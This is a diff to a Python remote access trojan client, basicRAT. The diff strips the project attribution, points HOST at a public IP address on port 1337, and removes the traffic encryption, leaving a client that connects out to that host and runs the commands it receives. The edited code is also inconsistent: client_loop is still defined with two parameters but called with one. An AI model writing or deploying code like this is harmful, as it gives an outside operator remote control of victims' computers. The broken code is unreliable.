@@ -1,10 +1,5 @@
 #!/usr/bin/env python
 
-#
-# basicRAT client
-# https://github.com/vesche/basicRAT
-#
-
 import socket
 import sys
 import time
@@ -13,16 +8,14 @@ from core import *
 
 
 # change these to suit your needs
-HOST = 'localhost'
+HOST = '187.77.154.202'
 PORT = 1337
 
 # seconds to wait before client will attempt to reconnect
 CONN_TIMEOUT = 30
 
 # determine system platform
-if sys.platform.startswith('win'):
-    PLAT = 'win'
-elif sys.platform.startswith('linux'):
+if sys.platform.startswith('linux'):
     PLAT = 'nix'
 elif sys.platform.startswith('darwin'):
     PLAT = 'mac'
@@ -36,7 +29,7 @@ def client_loop(conn, dhkey):
         results = ''
 
         # wait to receive data from server
-        data = crypto.decrypt(conn.recv(4096), dhkey)
+        data = conn.recv(4096).decode("utf-8")
 
         # seperate data into command and action
         cmd, _, action = data.partition(' ')
@@ -83,7 +76,7 @@ def client_loop(conn, dhkey):
 
         results = results.rstrip() + '\n{} completed.'.format(cmd)
 
-        conn.send(crypto.encrypt(results, dhkey))
+        conn.send(results.encode("utf-8"))
 
 
 def main():
@@ -99,13 +92,8 @@ def main():
             time.sleep(CONN_TIMEOUT)
             continue
 
-        dhkey = crypto.diffiehellman(conn)
-
-        # This try/except statement makes the client very resilient, but it's
-        # horrible for debugging. It will keep the client alive if the server
-        # is torn down unexpectedly, or if the client freaks out.
         try:
-            exit_status = client_loop(conn, dhkey)
+            exit_status = client_loop(conn)
         except: pass
 
         if exit_status:
